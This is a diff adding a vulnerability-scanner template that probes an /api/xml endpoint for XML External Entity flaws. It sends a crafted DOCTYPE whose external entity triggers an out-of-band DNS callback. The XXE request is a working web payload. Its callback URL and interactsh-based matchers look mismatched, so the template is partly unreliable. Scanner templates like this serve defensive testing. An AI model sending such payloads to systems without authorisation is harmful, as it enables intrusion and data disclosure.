@@ -1,0 +1,34 @@
+id: godnslog-xxe-oast
+info:
+  name: GODNSLOG XXE OAST Detection
+  author: GODNSLOG
+  severity: critical
+  description: |
+    Detects XML External Entity (XXE) vulnerabilities using GODNSLOG.
+    This template injects an external entity that triggers an out-of-band DNS interaction.
+
+requests:
+  - raw:
+      - |
+        POST /api/xml HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        User-Agent: {{User-Agent}}
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [
+          <!ENTITY xxe SYSTEM "http://{{godnslog_payload}}.{{Hostname}}">
+        ]>
+        <root>&xxe;</root>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '(?P<token>[a-zA-Z0-9]{16,32})'
